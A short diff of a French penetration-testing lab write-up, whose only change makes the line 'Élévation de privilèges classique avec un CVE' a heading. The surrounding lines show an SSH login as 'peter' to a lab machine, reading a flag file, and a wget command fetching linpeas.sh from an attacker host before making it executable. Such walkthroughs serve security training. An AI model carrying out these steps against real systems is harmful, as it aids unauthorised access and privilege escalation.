@@ -73,7 +73,7 @@ Tous les messages sont bloqués sauf le #234 qui indique indirectement le mot de
     ssh -l peter 192.168.231.170
     cat local.txt
 
-Élévation de privilèges classique avec un CVE :  
+### Élévation de privilèges classique avec un CVE :  
 
     wget http://192.168.45.239/linpeas.sh
     chmod u+x linpeas.sh
